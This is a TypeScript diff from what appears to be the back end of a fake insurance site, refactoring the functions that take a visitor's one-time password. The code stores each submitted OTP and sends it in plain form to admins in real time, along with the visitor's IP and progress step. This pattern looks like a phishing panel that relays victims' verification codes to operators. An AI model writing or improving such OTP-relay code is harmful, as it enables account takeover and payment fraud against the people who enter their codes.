@@ -316,18 +316,12 @@ export async function submitOtp(sessionId: string, otp: string): Promise<{ succe
     .update(insuranceRequests)
     .set({ otpSubmitted: otp })
     .where(eq(insuranceRequests.id, req.id));
-  const [request] = await db
-    .select()
-    .from(insuranceRequests)
-    .where(eq(insuranceRequests.id, req.id))
-    .limit(1);
+  const request: InsuranceRequest = { ...req, otpSubmitted: otp };
   // إشعار الإدارة بأن OTP تم إدخاله
   emitToAdmins("otpSubmitted", { requestId: req.id, otp });
-  if (request) {
-    emitToAdmins("requestUpdated", request);
-    if (request.visitorIp) {
-      emitToVisitor(request.visitorIp, "otpSubmitted", { requestId: req.id, otp });
-    }
+  emitToAdmins("requestUpdated", request);
+  if (request.visitorIp) {
+    emitToVisitor(request.visitorIp, "otpSubmitted", { requestId: req.id, otp });
   }
   return { success: true, request };
 }
@@ -347,17 +341,11 @@ export async function verifyOtp(sessionId: string): Promise<boolean> {
       .update(insuranceRequests)
       .set({ otpVerified: true, status: "otp_verified", currentStep: 6 })
       .where(eq(insuranceRequests.id, req.id));
-    const [request] = await db
-      .select()
-      .from(insuranceRequests)
-      .where(eq(insuranceRequests.id, req.id))
-      .limit(1);
+    const request: InsuranceRequest = { ...req, otpVerified: true, status: "otp_verified", currentStep: 6 };
     emitToAdmins("otpVerified", { requestId: req.id });
-    if (request) {
-      emitToAdmins("requestUpdated", request);
-      if (request.visitorIp) {
-        emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
-      }
+    emitToAdmins("requestUpdated", request);
+    if (request.visitorIp) {
+      emitToVisitor(request.visitorIp, "otpVerified", { requestId: req.id });
     }
     return true;
   }
